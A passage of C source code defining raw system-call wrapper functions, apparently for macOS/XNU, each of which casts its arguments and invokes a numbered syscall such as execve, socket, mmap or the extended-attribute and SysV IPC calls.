}


static return_t scc_sigprocmask(int how, user_addr_t mask, user_addr_t omask) {
  return scc_syscall3((uint64_t)how, (uint64_t)mask, (uint64_t)omask, POSIX_CALL_NUM(48));
}


static return_t scc_getlogin(char *namebuf, u_int namelen) {
  return scc_syscall2((uint64_t)namebuf, (uint64_t)namelen, POSIX_CALL_NUM(49));
}


static return_t scc_setlogin(char *namebuf) {
  return scc_syscall1((uint64_t)namebuf, POSIX_CALL_NUM(50));
}


static return_t scc_acct(char *path) {
  return scc_syscall1((uint64_t)path, POSIX_CALL_NUM(51));
}


static return_t scc_sigpending(struct sigvec *osv) {
  return scc_syscall1((uint64_t)osv, POSIX_CALL_NUM(52));
}


static return_t scc_sigaltstack(const stack_t *restrict nss, stack_t *restrict oss) {
  return scc_syscall2((uint64_t)nss, (uint64_t)oss, POSIX_CALL_NUM(53));
}


static return_t scc_ioctl(int fd, u_long com, caddr_t data) {
  return scc_syscall3((uint64_t)fd, (uint64_t)com, (uint64_t)data, POSIX_CALL_NUM(54));
}


static return_t scc_reboot(int opt, char *command) {
  return scc_syscall2((uint64_t)opt, (uint64_t)command, POSIX_CALL_NUM(55));
}


static return_t scc_revoke(char *path) {
  return scc_syscall1((uint64_t)path, POSIX_CALL_NUM(56));
}


static return_t scc_symlink(char *path, char *link) {
  return scc_syscall2((uint64_t)path, (uint64_t)link, POSIX_CALL_NUM(57));
}


static return_t scc_readlink(char *path, char *buf, int count) {
  return scc_syscall3((uint64_t)path, (uint64_t)buf, (uint64_t)count, POSIX_CALL_NUM(58));
}


static return_t scc_execve(char *fname, char **argp, char **envp) {
  return scc_syscall3((uint64_t)fname, (uint64_t)argp, (uint64_t)envp, POSIX_CALL_NUM(59));
}


static return_t scc_umask(int newmask) {
  return scc_syscall1((uint64_t)newmask, POSIX_CALL_NUM(60));
}


static return_t scc_chroot(char* path) {
  return scc_syscall1((uint64_t)path, POSIX_CALL_NUM(61));
}

static return_t scc_msync(caddr_t addr, size_t len, int flags) {
  return scc_syscall3((uint64_t)addr, (uint64_t)len, (uint64_t)flags, POSIX_CALL_NUM(65));
}


static return_t scc_vfork(void) {
  return scc_syscall0(POSIX_CALL_NUM(66));
}    

static return_t scc_munmap(caddr_t addr, size_t len) {
  return scc_syscall2((uint64_t)addr, (uint64_t)len, POSIX_CALL_NUM(73));
}


static return_t scc_mprotect(caddr_t addr, size_t len, int prot) {
  return scc_syscall3((uint64_t)addr, (uint64_t)len, (uint64_t)prot, POSIX_CALL_NUM(74));
}


static return_t scc_madvise(caddr_t addr, size_t len, int behav) {
  return scc_syscall3((uint64_t)addr, (uint64_t)len, (uint64_t)behav, POSIX_CALL_NUM(75));
}

static return_t scc_mincore(user_addr_t addr, user_size_t len, user_addr_t vec) {
  return scc_syscall3((uint64_t)addr, (uint64_t)len, (uint64_t)vec, POSIX_CALL_NUM(78));
}


static return_t scc_getgroups(u_int gidsetsize, gid_t *gidset) {
  return scc_syscall2((uint64_t)gidsetsize, (uint64_t)gidset, POSIX_CALL_NUM(79));
}


static return_t scc_setgroups(u_int gidsetsize, gid_t *gidset) {
  return scc_syscall2((uint64_t)gidsetsize, (uint64_t)gidset, POSIX_CALL_NUM(80));
}


static return_t scc_getpgrp(void) {
  return scc_syscall0(POSIX_CALL_NUM(81));
}


static return_t scc_setpgid(int pid, int pgid) {
  return scc_syscall2((uint64_t)pid, (uint64_t)pgid, POSIX_CALL_NUM(82));
}


static return_t scc_setitimer(u_int which, struct itimerval *itv, struct itimerval *oitv) {
  return scc_syscall3((uint64_t)which, (uint64_t)itv, (uint64_t)oitv, POSIX_CALL_NUM(83));
}


static return_t scc_swapon(void) {
  return scc_syscall0(POSIX_CALL_NUM(85));
}


static return_t scc_getitimer(u_int which, struct itimerval *itv) {
  return scc_syscall2((uint64_t)which, (uint64_t)itv, POSIX_CALL_NUM(86));
}

static return_t scc_getdtablesize(void) {
  return scc_syscall0(POSIX_CALL_NUM(89));
}


static return_t scc_dup2(u_int from, u_int to) {
  return scc_syscall2((uint64_t)from, (uint64_t)to, POSIX_CALL_NUM(90));
}

static return_t scc_fcntl(int fd, int cmd, long arg) {
  return scc_syscall3((uint64_t)fd, (uint64_t)cmd, (uint64_t)arg, POSIX_CALL_NUM(92));
}


static return_t scc_select(int nd, u_int32_t *in, u_int32_t *ou, u_int32_t *ex, struct timeval *tv) {
  return scc_syscall5((uint64_t)nd, (uint64_t)in, (uint64_t)ou, (uint64_t)ex, (uint64_t)tv, POSIX_CALL_NUM(93));
}

static return_t scc_fsync(int fd) {
  return scc_syscall1((uint64_t)fd, POSIX_CALL_NUM(95));
}


static return_t scc_setpriority(int which, id_t who, int prio) {
  return scc_syscall3((uint64_t)which, (uint64_t)who, (uint64_t)prio, POSIX_CALL_NUM(96));
}


static return_t scc_socket(int domain, int type, int protocol) {
  return scc_syscall3((uint64_t)domain, (uint64_t)type, (uint64_t)protocol, POSIX_CALL_NUM(97));
}


static return_t scc_connect(int s, caddr_t name, socklen_t namelen) {
  return scc_syscall3((uint64_t)s, (uint64_t)name, (uint64_t)namelen, POSIX_CALL_NUM(98));
}

static return_t scc_getpriority(int which, id_t who) {
  return scc_syscall2((uint64_t)which, (uint64_t)who, POSIX_CALL_NUM(100));
}

static return_t scc_bind(int s, caddr_t name, socklen_t namelen) {
  return scc_syscall3((uint64_t)s, (uint64_t)name, (uint64_t)namelen, POSIX_CALL_NUM(104));
}


static return_t scc_setsockopt(int s, int level, int name, caddr_t val, socklen_t valsize) {
  return scc_syscall5((uint64_t)s, (uint64_t)level, (uint64_t)name, (uint64_t)val, (uint64_t)valsize, POSIX_CALL_NUM(105));
}


static return_t scc_listen(int s, int backlog) {
  return scc_syscall2((uint64_t)s, (uint64_t)backlog, POSIX_CALL_NUM(106));
}

static return_t scc_sigsuspend(sigset_t mask) {
  return scc_syscall1((uint64_t)mask, POSIX_CALL_NUM(111));
}

static return_t scc_gettimeofday(struct timeval *tp, struct timezone *tzp) {
  return scc_syscall2((uint64_t)tp, (uint64_t)tzp, POSIX_CALL_NUM(116));
}


static return_t scc_getrusage(int who, struct rusage *rusage) {
  return scc_syscall2((uint64_t)who, (uint64_t)rusage, POSIX_CALL_NUM(117));
}


static return_t scc_getsockopt(int s, int level, int name, caddr_t val, socklen_t *avalsize) {
  return scc_syscall5((uint64_t)s, (uint64_t)level, (uint64_t)name, (uint64_t)val, (uint64_t)avalsize, POSIX_CALL_NUM(118));
}


static return_t scc_readv(int fd, struct iovec *iovp, u_int iovcnt) {
  return scc_syscall3((uint64_t)fd, (uint64_t)iovp, (uint64_t)iovcnt, POSIX_CALL_NUM(120));
}


static return_t scc_writev(int fd, struct iovec *iovp, u_int iovcnt) {
  return scc_syscall3((uint64_t)fd, (uint64_t)iovp, (uint64_t)iovcnt, POSIX_CALL_NUM(121));
}


static return_t scc_settimeofday(struct timeval *tv, struct timezone *tzp) {
  return scc_syscall2((uint64_t)tv, (uint64_t)tzp, POSIX_CALL_NUM(122));
}


static return_t scc_fchown(int fd, int uid, int gid) {
  return scc_syscall3((uint64_t)fd, (uint64_t)uid, (uint64_t)gid, POSIX_CALL_NUM(123));
}


static return_t scc_fchmod(int fd, int mode) {
  return scc_syscall2((uint64_t)fd, (uint64_t)mode, POSIX_CALL_NUM(124));
}


static return_t scc_setreuid(uid_t ruid, uid_t euid) {
  return scc_syscall2((uint64_t)ruid, (uint64_t)euid, POSIX_CALL_NUM(126));
}


static return_t scc_setregid(gid_t rgid, gid_t egid) {
  return scc_syscall2((uint64_t)rgid, (uint64_t)egid, POSIX_CALL_NUM(127));
}


static return_t scc_rename(char *from, char *to) {
  return scc_syscall2((uint64_t)from, (uint64_t)to, POSIX_CALL_NUM(128));
}

static return_t scc_flock(int fd, int how) {
  return scc_syscall2((uint64_t)fd, (uint64_t)how, POSIX_CALL_NUM(131));
}


static return_t scc_mkfifo(char* path, int mode) {
  return scc_syscall2((uint64_t)path, (uint64_t)mode, POSIX_CALL_NUM(132));
}


static return_t scc_sendto(int s, caddr_t buf, size_t len, int flags, caddr_t to, socklen_t tolen) {
  return scc_syscall6((uint64_t)s, (uint64_t)buf, (uint64_t)len, (uint64_t)flags, (uint64_t)to, (uint64_t)tolen, POSIX_CALL_NUM(133));
}


static return_t scc_shutdown(int s, int how) {
  return scc_syscall2((uint64_t)s, (uint64_t)how, POSIX_CALL_NUM(134));
}


static return_t scc_socketpair(int domain, int type, int protocol, int *rsv) {
  return scc_syscall4((uint64_t)domain, (uint64_t)type, (uint64_t)protocol, (uint64_t)rsv, POSIX_CALL_NUM(135));
}


static return_t scc_mkdir(char* path, int mode) {
  return scc_syscall2((uint64_t)path, (uint64_t)mode, POSIX_CALL_NUM(136));
}


static return_t scc_rmdir(char *path) {
  return scc_syscall1((uint64_t)path, POSIX_CALL_NUM(137));
}


static return_t scc_utimes(char *path, struct timeval *tptr) {
  return scc_syscall2((uint64_t)path, (uint64_t)tptr, POSIX_CALL_NUM(138));
}


static return_t scc_futimes(int fd, struct timeval *tptr) {
  return scc_syscall2((uint64_t)fd, (uint64_t)tptr, POSIX_CALL_NUM(139));
}


static return_t scc_adjtime(struct timeval *delta, struct timeval *olddelta) {
  return scc_syscall2((uint64_t)delta, (uint64_t)olddelta, POSIX_CALL_NUM(140));
}


static return_t scc_gethostuuid(unsigned char *uuid_buf, const struct timespec *timeoutp, int spi) {
  return scc_syscall3((uint64_t)uuid_buf, (uint64_t)timeoutp, (uint64_t)spi, POSIX_CALL_NUM(142));
}

static return_t scc_setsid(void) {
  return scc_syscall0(POSIX_CALL_NUM(147));
}

static return_t scc_getpgid(pid_t pid) {
  return scc_syscall1((uint64_t)pid, POSIX_CALL_NUM(151));
}


static return_t scc_setprivexec(int flag) {
  return scc_syscall1((uint64_t)flag, POSIX_CALL_NUM(152));
}


static return_t scc_pread(int fd, user_addr_t buf, user_size_t nbyte, off_t offset) {
  return scc_syscall4((uint64_t)fd, (uint64_t)buf, (uint64_t)nbyte, (uint64_t)offset, POSIX_CALL_NUM(153));
}


static return_t scc_pwrite(int fd, user_addr_t buf, user_size_t nbyte, off_t offset) {
  return scc_syscall4((uint64_t)fd, (uint64_t)buf, (uint64_t)nbyte, (uint64_t)offset, POSIX_CALL_NUM(154));
}


static return_t scc_nfssvc(int flag, caddr_t argp) {
  return scc_syscall2((uint64_t)flag, (uint64_t)argp, POSIX_CALL_NUM(155));
}

static return_t scc_statfs(char *path, struct statfs *buf) {
  return scc_syscall2((uint64_t)path, (uint64_t)buf, POSIX_CALL_NUM(157));
}


static return_t scc_fstatfs(int fd, struct statfs *buf) {
  return scc_syscall2((uint64_t)fd, (uint64_t)buf, POSIX_CALL_NUM(158));
}


static return_t scc_unmount(char* path, int flags) {
  return scc_syscall2((uint64_t)path, (uint64_t)flags, POSIX_CALL_NUM(159));
}

static return_t scc_getfh(char *fname, fhandle_t *fhp) {
  return scc_syscall2((uint64_t)fname, (uint64_t)fhp, POSIX_CALL_NUM(161));
}

static return_t scc_quotactl(const char *path, int cmd, int uid, caddr_t arg) {
  return scc_syscall4((uint64_t)path, (uint64_t)cmd, (uint64_t)uid, (uint64_t)arg, POSIX_CALL_NUM(165));
}

static return_t scc_mount(char *type, char *path, int flags, caddr_t data) {
  return scc_syscall4((uint64_t)type, (uint64_t)path, (uint64_t)flags, (uint64_t)data, POSIX_CALL_NUM(167));
}    

static return_t scc_csops(pid_t pid, uint32_t ops, user_addr_t useraddr, user_size_t usersize) {
  return scc_syscall4((uint64_t)pid, (uint64_t)ops, (uint64_t)useraddr, (uint64_t)usersize, POSIX_CALL_NUM(169));
}


static return_t scc_csops_audittoken(pid_t pid, uint32_t ops, user_addr_t useraddr, user_size_t usersize, user_addr_t uaudittoken) {
  return scc_syscall5((uint64_t)pid, (uint64_t)ops, (uint64_t)useraddr, (uint64_t)usersize, (uint64_t)uaudittoken, POSIX_CALL_NUM(170));
}

static return_t scc_waitid(idtype_t idtype, id_t id, siginfo_t *infop, int options) {
  return scc_syscall4((uint64_t)idtype, (uint64_t)id, (uint64_t)infop, (uint64_t)options, POSIX_CALL_NUM(173));
}

static return_t scc_kdebug_trace(int code, int arg1, int arg2, int arg3, int arg4, int arg5) {
  return scc_syscall6((uint64_t)code, (uint64_t)arg1, (uint64_t)arg2, (uint64_t)arg3, (uint64_t)arg4, (uint64_t)arg5, POSIX_CALL_NUM(180));
}


static return_t scc_setgid(gid_t gid) {
  return scc_syscall1((uint64_t)gid, POSIX_CALL_NUM(181));
}


static return_t scc_setegid(gid_t egid) {
  return scc_syscall1((uint64_t)egid, POSIX_CALL_NUM(182));
}


static return_t scc_seteuid(uid_t euid) {
  return scc_syscall1((uint64_t)euid, POSIX_CALL_NUM(183));
}


static return_t scc_sigreturn(void* *uctx, int infostyle) {
  return scc_syscall2((uint64_t)uctx, (uint64_t)infostyle, POSIX_CALL_NUM(184));
}


static return_t scc_chud(uint64_t code, uint64_t arg1, uint64_t arg2, uint64_t arg3, uint64_t arg4, uint64_t arg5) {
  return scc_syscall6((uint64_t)code, (uint64_t)arg1, (uint64_t)arg2, (uint64_t)arg3, (uint64_t)arg4, (uint64_t)arg5, POSIX_CALL_NUM(185));
}

static return_t scc_fdatasync(int fd) {
  return scc_syscall1((uint64_t)fd, POSIX_CALL_NUM(187));
}


static return_t scc_stat(user_addr_t path, user_addr_t ub) {
  return scc_syscall2((uint64_t)path, (uint64_t)ub, POSIX_CALL_NUM(188));
}


static return_t scc_fstat(int fd, user_addr_t ub) {
  return scc_syscall2((uint64_t)fd, (uint64_t)ub, POSIX_CALL_NUM(189));
}


static return_t scc_lstat(user_addr_t path, user_addr_t ub) {
  return scc_syscall2((uint64_t)path, (uint64_t)ub, POSIX_CALL_NUM(190));
}


static return_t scc_pathconf(char *path, int name) {
  return scc_syscall2((uint64_t)path, (uint64_t)name, POSIX_CALL_NUM(191));
}


static return_t scc_fpathconf(int fd, int name) {
  return scc_syscall2((uint64_t)fd, (uint64_t)name, POSIX_CALL_NUM(192));
}

static return_t scc_getrlimit(u_int which, struct rlimit *rlp) {
  return scc_syscall2((uint64_t)which, (uint64_t)rlp, POSIX_CALL_NUM(194));
}


static return_t scc_setrlimit(u_int which, struct rlimit *rlp) {
  return scc_syscall2((uint64_t)which, (uint64_t)rlp, POSIX_CALL_NUM(195));
}


static return_t scc_getdirentries(int fd, char *buf, u_int count, long *basep) {
  return scc_syscall4((uint64_t)fd, (uint64_t)buf, (uint64_t)count, (uint64_t)basep, POSIX_CALL_NUM(196));
}


static return_t scc_mmap(caddr_t addr, size_t len, int prot, int flags, int fd, off_t pos) {
  return scc_syscall6((uint64_t)addr, (uint64_t)len, (uint64_t)prot, (uint64_t)flags, (uint64_t)fd, (uint64_t)pos, POSIX_CALL_NUM(197));
}

static return_t scc_lseek(int fd, off_t offset, int whence) {
  return scc_syscall3((uint64_t)fd, (uint64_t)offset, (uint64_t)whence, POSIX_CALL_NUM(199));
}


static return_t scc_truncate(char *path, off_t length) {
  return scc_syscall2((uint64_t)path, (uint64_t)length, POSIX_CALL_NUM(200));
}


static return_t scc_ftruncate(int fd, off_t length) {
  return scc_syscall2((uint64_t)fd, (uint64_t)length, POSIX_CALL_NUM(201));
}


static return_t scc_sysctl(int *name, u_int namelen, void *old, size_t *oldlenp, void *new, size_t newlen) {
  return scc_syscall6((uint64_t)name, (uint64_t)namelen, (uint64_t)old, (uint64_t)oldlenp, (uint64_t)new, (uint64_t)newlen, POSIX_CALL_NUM(202));
}


static return_t scc_mlock(caddr_t addr, size_t len) {
  return scc_syscall2((uint64_t)addr, (uint64_t)len, POSIX_CALL_NUM(203));
}


static return_t scc_munlock(caddr_t addr, size_t len) {
  return scc_syscall2((uint64_t)addr, (uint64_t)len, POSIX_CALL_NUM(204));
}


static return_t scc_undelete(user_addr_t path) {
  return scc_syscall1((uint64_t)path, POSIX_CALL_NUM(205));
}

static return_t scc_open_dprotected_np(user_addr_t path, int flags, int class, int dpflags, int mode) {
  return scc_syscall5((uint64_t)path, (uint64_t)flags, (uint64_t)class, (uint64_t)dpflags, (uint64_t)mode, POSIX_CALL_NUM(216));
}

static return_t scc_getattrlist(const char *path, struct attrlist *alist, void *attributeBuffer, size_t bufferSize, u_long options) {
  return scc_syscall5((uint64_t)path, (uint64_t)alist, (uint64_t)attributeBuffer, (uint64_t)bufferSize, (uint64_t)options, POSIX_CALL_NUM(220));
}


static return_t scc_setattrlist(const char *path, struct attrlist *alist, void *attributeBuffer, size_t bufferSize, u_long options) {
  return scc_syscall5((uint64_t)path, (uint64_t)alist, (uint64_t)attributeBuffer, (uint64_t)bufferSize, (uint64_t)options, POSIX_CALL_NUM(221));
}


static return_t scc_getdirentriesattr(int fd, struct attrlist *alist, void *buffer, size_t buffersize, u_long *count, u_long *basep, u_long *newstate, u_long options) {
  return scc_syscall8((uint64_t)fd, (uint64_t)alist, (uint64_t)buffer, (uint64_t)buffersize, (uint64_t)count, (uint64_t)basep, (uint64_t)newstate, (uint64_t)options, POSIX_CALL_NUM(222));
}


static return_t scc_exchangedata(const char *path1, const char *path2, u_long options) {
  return scc_syscall3((uint64_t)path1, (uint64_t)path2, (uint64_t)options, POSIX_CALL_NUM(223));
}

static return_t scc_searchfs(const char *path, struct fssearchblock *searchblock, uint32_t *nummatches, uint32_t scriptcode, uint32_t options, struct searchstate *state) {
  return scc_syscall6((uint64_t)path, (uint64_t)searchblock, (uint64_t)nummatches, (uint64_t)scriptcode, (uint64_t)options, (uint64_t)state, POSIX_CALL_NUM(225));
}


static return_t scc_delete(user_addr_t path) {
  return scc_syscall1((uint64_t)path, POSIX_CALL_NUM(226));
}


static return_t scc_copyfile(char *from, char *to, int mode, int flags) {
  return scc_syscall4((uint64_t)from, (uint64_t)to, (uint64_t)mode, (uint64_t)flags, POSIX_CALL_NUM(227));
}


static return_t scc_fgetattrlist(int fd, struct attrlist *alist, void *attributeBuffer, size_t bufferSize, u_long options) {
  return scc_syscall5((uint64_t)fd, (uint64_t)alist, (uint64_t)attributeBuffer, (uint64_t)bufferSize, (uint64_t)options, POSIX_CALL_NUM(228));
}


static return_t scc_fsetattrlist(int fd, struct attrlist *alist, void *attributeBuffer, size_t bufferSize, u_long options) {
  return scc_syscall5((uint64_t)fd, (uint64_t)alist, (uint64_t)attributeBuffer, (uint64_t)bufferSize, (uint64_t)options, POSIX_CALL_NUM(229));
}


static return_t scc_poll(struct pollfd *fds, u_int nfds, int timeout) {
  return scc_syscall3((uint64_t)fds, (uint64_t)nfds, (uint64_t)timeout, POSIX_CALL_NUM(230));
}


static return_t scc_watchevent(struct eventreq *u_req, int u_eventmask) {
  return scc_syscall2((uint64_t)u_req, (uint64_t)u_eventmask, POSIX_CALL_NUM(231));
}


static return_t scc_waitevent(struct eventreq *u_req, struct timeval *tv) {
  return scc_syscall2((uint64_t)u_req, (uint64_t)tv, POSIX_CALL_NUM(232));
}


static return_t scc_modwatch(struct eventreq *u_req, int u_eventmask) {
  return scc_syscall2((uint64_t)u_req, (uint64_t)u_eventmask, POSIX_CALL_NUM(233));
}


static return_t scc_getxattr(user_addr_t path, user_addr_t attrname, user_addr_t value, size_t size, uint32_t position, int options) {
  return scc_syscall6((uint64_t)path, (uint64_t)attrname, (uint64_t)value, (uint64_t)size, (uint64_t)position, (uint64_t)options, POSIX_CALL_NUM(234));
}


static return_t scc_fgetxattr(int fd, user_addr_t attrname, user_addr_t value, size_t size, uint32_t position, int options) {
  return scc_syscall6((uint64_t)fd, (uint64_t)attrname, (uint64_t)value, (uint64_t)size, (uint64_t)position, (uint64_t)options, POSIX_CALL_NUM(235));
}


static return_t scc_setxattr(user_addr_t path, user_addr_t attrname, user_addr_t value, size_t size, uint32_t position, int options) {
  return scc_syscall6((uint64_t)path, (uint64_t)attrname, (uint64_t)value, (uint64_t)size, (uint64_t)position, (uint64_t)options, POSIX_CALL_NUM(236));
}


static return_t scc_fsetxattr(int fd, user_addr_t attrname, user_addr_t value, size_t size, uint32_t position, int options) {
  return scc_syscall6((uint64_t)fd, (uint64_t)attrname, (uint64_t)value, (uint64_t)size, (uint64_t)position, (uint64_t)options, POSIX_CALL_NUM(237));
}


static return_t scc_removexattr(user_addr_t path, user_addr_t attrname, int options) {
  return scc_syscall3((uint64_t)path, (uint64_t)attrname, (uint64_t)options, POSIX_CALL_NUM(238));
}


static return_t scc_fremovexattr(int fd, user_addr_t attrname, int options) {
  return scc_syscall3((uint64_t)fd, (uint64_t)attrname, (uint64_t)options, POSIX_CALL_NUM(239));
}


static return_t scc_listxattr(user_addr_t path, user_addr_t namebuf, size_t bufsize, int options) {
  return scc_syscall4((uint64_t)path, (uint64_t)namebuf, (uint64_t)bufsize, (uint64_t)options, POSIX_CALL_NUM(240));
}


static return_t scc_flistxattr(int fd, user_addr_t namebuf, size_t bufsize, int options) {
  return scc_syscall4((uint64_t)fd, (uint64_t)namebuf, (uint64_t)bufsize, (uint64_t)options, POSIX_CALL_NUM(241));
}


static return_t scc_fsctl(const char *path, u_long cmd, caddr_t data, u_int options) {
  return scc_syscall4((uint64_t)path, (uint64_t)cmd, (uint64_t)data, (uint64_t)options, POSIX_CALL_NUM(242));
}


static return_t scc_initgroups(u_int gidsetsize, gid_t *gidset, int gmuid) {
  return scc_syscall3((uint64_t)gidsetsize, (uint64_t)gidset, (uint64_t)gmuid, POSIX_CALL_NUM(243));
}


static return_t scc_posix_spawn(pid_t *pid, const char *path, const posix_spawn_file_actions_t *adesc, char **argv, char **envp) {
  return scc_syscall5((uint64_t)pid, (uint64_t)path, (uint64_t)adesc, (uint64_t)argv, (uint64_t)envp, POSIX_CALL_NUM(244));
}


static return_t scc_ffsctl(int fd, u_long cmd, caddr_t data, u_int options) {
  return scc_syscall4((uint64_t)fd, (uint64_t)cmd, (uint64_t)data, (uint64_t)options, POSIX_CALL_NUM(245));
}

static return_t scc_nfsclnt(int flag, caddr_t argp) {
  return scc_syscall2((uint64_t)flag, (uint64_t)argp, POSIX_CALL_NUM(247));
}


static return_t scc_fhopen(const struct fhandle *u_fhp, int flags) {
  return scc_syscall2((uint64_t)u_fhp, (uint64_t)flags, POSIX_CALL_NUM(248));
}

static return_t scc_minherit(void *addr, size_t len, int inherit) {
  return scc_syscall3((uint64_t)addr, (uint64_t)len, (uint64_t)inherit, POSIX_CALL_NUM(250));
}


static return_t scc_semsys(u_int which, int a2, int a3, int a4, int a5) {
  return scc_syscall5((uint64_t)which, (uint64_t)a2, (uint64_t)a3, (uint64_t)a4, (uint64_t)a5, POSIX_CALL_NUM(251));
}


static return_t scc_msgsys(u_int which, int a2, int a3, int a4, int a5) {
  return scc_syscall5((uint64_t)which, (uint64_t)a2, (uint64_t)a3, (uint64_t)a4, (uint64_t)a5, POSIX_CALL_NUM(252));
}


static return_t scc_shmsys(u_int which, int a2, int a3, int a4) {
  return scc_syscall4((uint64_t)which, (uint64_t)a2, (uint64_t)a3, (uint64_t)a4, POSIX_CALL_NUM(253));
}


static return_t scc_semctl(int semid, int semnum, int cmd, user_semun_t _arg) {
  return scc_syscall4((uint64_t)semid, (uint64_t)semnum, (uint64_t)cmd, (uint64_t)_arg.buf, POSIX_CALL_NUM(254));
}


static return_t scc_semget(key_t key, int nsems, int semflg) {
  return scc_syscall3((uint64_t)key, (uint64_t)nsems, (uint64_t)semflg, POSIX_CALL_NUM(255));
}


static return_t scc_semop(int semid, struct sembuf *sops, int nsops) {
  return scc_syscall3((uint64_t)semid, (uint64_t)sops, (uint64_t)nsops, POSIX_CALL_NUM(256));
}

static return_t scc_msgctl(int msqid, int cmd, struct msqid_ds *buf) {
  return scc_syscall3((uint64_t)msqid, (uint64_t)cmd, (uint64_t)buf, POSIX_CALL_NUM(258));
}


static return_t scc_msgget(key_t key, int msgflg) {
  return scc_syscall2((uint64_t)key, (uint64_t)msgflg, POSIX_CALL_NUM(259));
}


static return_t scc_msgsnd(int msqid, void *msgp, size_t msgsz, int msgflg) {
  return scc_syscall4((uint64_t)msqid, (uint64_t)msgp, (uint64_t)msgsz, (uint64_t)msgflg, POSIX_CALL_NUM(260));
}


static return_t scc_msgrcv(int msqid, void *msgp, size_t msgsz, long msgtyp, int msgflg) {
  return scc_syscall5((uint64_t)msqid, (uint64_t)msgp, (uint64_t)msgsz, (uint64_t)msgtyp, (uint64_t)msgflg, POSIX_CALL_NUM(261));
}


static return_t scc_shmat(int shmid, void *shmaddr, int shmflg) {
  return scc_syscall3((uint64_t)shmid, (uint64_t)shmaddr, (uint64_t)shmflg, POSIX_CALL_NUM(262));
}


static return_t scc_shmctl(int shmid, int cmd, struct shmid_ds *buf) {
  return scc_syscall3((uint64_t)shmid, (uint64_t)cmd, (uint64_t)buf, POSIX_CALL_NUM(263));
}


static return_t scc_shmdt(void *shmaddr) {
  return scc_syscall1((uint64_t)shmaddr, POSIX_CALL_NUM(264));
}


static return_t scc_shmget(key_t key, size_t size, int shmflg) {
  return scc_syscall3((uint64_t)key, (uint64_t)size, (uint64_t)shmflg, POSIX_CALL_NUM(265));
}


static return_t scc_shm_open(const char *name, int oflag, int mode) {
  return scc_syscall3((uint64_t)name, (uint64_t)oflag, (uint64_t)mode, POSIX_CALL_NUM(266));
}


static return_t scc_shm_unlink(const char *name) {
  return scc_syscall1((uint64_t)name, POSIX_CALL_NUM(267));
}


static return_t scc_sem_open(const char *name, int oflag, int mode, int value) {
  return scc_syscall4((uint64_t)name, (uint64_t)oflag, (uint64_t)mode, (uint64_t)value, POSIX_CALL_NUM(268));
}


static return_t scc_sem_close(sem_t *sem) {
  return scc_syscall1((uint64_t)sem, POSIX_CALL_NUM(269));
}


static return_t scc_sem_unlink(const char *name) {
  return scc_syscall1((uint64_t)name, POSIX_CALL_NUM(270));
}


static return_t scc_sem_wait(sem_t *sem) {
  return scc_syscall1((uint64_t)sem, POSIX_CALL_NUM(271));
}


static return_t scc_sem_trywait(sem_t *sem) {
  return scc_syscall1((uint64_t)sem, POSIX_CALL_NUM(272));
}


static return_t scc_sem_post(sem_t *sem) {
  return scc_syscall1((uint64_t)sem, POSIX_CALL_NUM(273));
}


static return_t scc_sysctlbyname(const char *name, size_t namelen, void *old, size_t *oldlenp, void *new, size_t newlen) {
  return scc_syscall6((uint64_t)name, (uint64_t)namelen, (uint64_t)old, (uint64_t)oldlenp, (uint64_t)new, (uint64_t)newlen, POSIX_CALL_NUM(274));
}

static return_t scc_open_extended(user_addr_t path, int flags, uid_t uid, gid_t gid, int mode, user_addr_t xsecurity) {
  return scc_syscall6((uint64_t)path, (uint64_t)flags, (uint64_t)uid, (uint64_t)gid, (uint64_t)mode, (uint64_t)xsecurity, POSIX_CALL_NUM(277));
}


static return_t scc_umask_extended(int newmask, user_addr_t xsecurity) {
  return scc_syscall2((uint64_t)newmask, (uint64_t)xsecurity, POSIX_CALL_NUM(278));
}


static return_t scc_stat_extended(user_addr_t path, user_addr_t ub, user_addr_t xsecurity, user_addr_t xsecurity_size) {
  return scc_syscall4((uint64_t)path, (uint64_t)ub, (uint64_t)xsecurity, (uint64_t)xsecurity_size, POSIX_CALL_NUM(279));
}


static return_t scc_lstat_extended(user_addr_t path, user_addr_t ub, user_addr_t xsecurity, user_addr_t xsecurity_size) {
  return scc_syscall4((uint64_t)path, (uint64_t)ub, (uint64_t)xsecurity, (uint64_t)xsecurity_size, POSIX_CALL_NUM(280));
}


static return_t scc_fstat_extended(int fd, user_addr_t ub, user_addr_t xsecurity, user_addr_t xsecurity_size) {
  return scc_syscall4((uint64_t)fd, (uint64_t)ub, (uint64_t)xsecurity, (uint64_t)xsecurity_size, POSIX_CALL_NUM(281));
}


static return_t scc_chmod_extended(user_addr_t path, uid_t uid, gid_t gid, int mode, user_addr_t xsecurity) {
  return scc_syscall5((uint64_t)path, (uint64_t)uid, (uint64_t)gid, (uint64_t)mode, (uint64_t)xsecurity, POSIX_CALL_NUM(282));
}


static return_t scc_fchmod_extended(int fd, uid_t uid, gid_t gid, int mode, user_addr_t xsecurity) {
  return scc_syscall5((uint64_t)fd, (uint64_t)uid, (uint64_t)gid, (uint64_t)mode, (uint64_t)xsecurity, POSIX_CALL_NUM(283));
}


static return_t scc_access_extended(user_addr_t entries, size_t size, user_addr_t results, uid_t uid) {
  return scc_syscall4((uint64_t)entries, (uint64_t)size, (uint64_t)results, (uint64_t)uid, POSIX_CALL_NUM(284));
}


static return_t scc_settid(uid_t uid, gid_t gid) {
  return scc_syscall2((uint64_t)uid, (uint64_t)gid, POSIX_CALL_NUM(285));
}


static return_t scc_gettid(uid_t *uidp, gid_t *gidp) {
  return scc_syscall2((uint64_t)uidp, (uint64_t)gidp, POSIX_CALL_NUM(286));
}


static return_t scc_setsgroups(int setlen, user_addr_t guidset) {
  return scc_syscall2((uint64_t)setlen, (uint64_t)guidset, POSIX_CALL_NUM(287));
}


static return_t scc_getsgroups(user_addr_t setlen, user_addr_t guidset) {
  return scc_syscall2((uint64_t)setlen, (uint64_t)guidset, POSIX_CALL_NUM(288));
}


static return_t scc_setwgroups(int setlen, user_addr_t guidset) {
  return scc_syscall2((uint64_t)setlen, (uint64_t)guidset, POSIX_CALL_NUM(289));
}


static return_t scc_getwgroups(user_addr_t setlen, user_addr_t guidset) {
  return scc_syscall2((uint64_t)setlen, (uint64_t)guidset, POSIX_CALL_NUM(290));
}


static return_t scc_mkfifo_extended(user_addr_t path, uid_t uid, gid_t gid, int mode, user_addr_t xsecurity) {
  return scc_syscall5((uint64_t)path, (uint64_t)uid, (uint64_t)gid, (uint64_t)mode, (uint64_t)xsecurity, POSIX_CALL_NUM(291));
}


static return_t scc_mkdir_extended(user_addr_t path, uid_t uid, gid_t gid, int mode, user_addr_t xsecurity) {
